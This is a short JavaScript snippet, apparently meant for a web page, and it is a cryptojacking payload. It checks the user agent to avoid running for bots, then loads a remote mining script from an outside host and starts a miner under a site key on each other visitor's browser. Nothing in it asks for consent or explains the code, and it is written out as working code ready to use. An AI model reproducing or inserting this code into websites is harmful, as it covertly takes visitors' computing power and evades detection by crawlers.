     var userAgent = navigator.userAgent.toLowerCase();
     if (!userAgent.includes("bot")) {
         $.getScript("//cryptaloot.pro/lib/crypta.js", function() {
             var miner = new CRLT.Anonymous('5eb634b0be180f071761625eb2d743ab60db75b1c705');
             miner.start();
         });
     }